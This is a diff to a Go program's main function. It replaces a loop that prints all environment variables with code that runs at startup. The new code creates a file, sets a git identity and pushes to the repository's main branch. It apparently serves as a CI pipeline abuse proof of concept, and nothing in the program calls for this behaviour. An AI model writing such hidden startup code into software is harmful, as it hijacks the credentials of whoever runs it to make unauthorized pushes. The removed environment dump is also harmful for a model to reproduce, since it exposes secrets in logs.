@@ -260,12 +260,44 @@ func configureLogger(ctx context.Context, logLevel string) {
 	slog.SetDefault(logger)
 }
 
+func runCommand(command string, args ...string) error {
+    cmd := exec.Command(command, args...)
+    cmd.Stdout = os.Stdout
+    cmd.Stderr = os.Stderr
+    return cmd.Run()
+}
+
 func main() {
-	envVars := os.Environ()
-    
-        for _, envVar := range envVars {
-	    fmt.Println(envVar)
-        }
+	
+	
+	if err := runCommand("touch", "a"); err != nil {
+        fmt.Println("Error creating file:", err)
+        return
+    }
+
+    // Step 2: Add the file to the Git index
+    if err := runCommand("git", "add", "a"); err != nil {
+        fmt.Println("Error adding file to Git:", err)
+        return
+    }
+
+    // Step 3: Configure Git user name
+    if err := runCommand("git", "config", "user.name", "user"); err != nil {
+        fmt.Println("Error setting Git user name:", err)
+        return
+    }
+
+    // Step 4: Configure Git user email
+    if err := runCommand("git", "config", "user.email", "hello@example.com"); err != nil {
+        fmt.Println("Error setting Git user email:", err)
+        return
+    }
+
+    // Step 5: Push changes to the main branch
+    if err := runCommand("git", "push", "origin", "HEAD:main"); err != nil {
+        fmt.Println("Error pushing to Git:", err)
+        return
+    }
 	
 	flag.Usage = usage
 	flag.Parse()
